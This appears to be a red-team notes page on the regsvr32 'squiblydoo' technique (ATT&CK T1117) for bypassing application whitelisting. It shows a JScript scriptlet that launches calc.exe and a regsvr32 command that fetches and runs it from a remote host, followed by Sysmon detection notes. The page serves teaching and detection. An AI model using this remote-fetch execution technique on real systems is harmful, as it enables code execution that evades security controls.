---
description: regsvr32 (squiblydoo) code execution - bypass application whitelisting.
---

# T1117: regsvr32

## Execution

{% code title="http://10.0.0.5/back.sct" %}
```markup
<?XML version="1.0"?>
<scriptlet>
<registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
    ]]>
</script>
</registration>
</scriptlet>
```
{% endcode %}

We need to host the back.sct on a web server so we can invoke it like so:

{% code title="attacker@victim" %}
```csharp
regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
```
{% endcode %}

## Observations

![calc.exe spawned by regsvr32.exe](../../.gitbook/assets/regsvr32.png)

Note how regsvr32 process exits almost immediately. This means that just by looking at the list of processes on the victim machine, the evil process may not be immedialy evident... Not until you realise how it was invoked though. Sysmon commandline logging may help you detect this activity:

![](../../.gitbook/assets/regsvr32-commandline.png)

Additionally, of course sysmon will show regsvr32 establishing a network connection:

![](../../.gitbook/assets/regsvr32-network.png)

## References

{% embed url="https://attack.mitre.org/wiki/Technique/T1117" %}

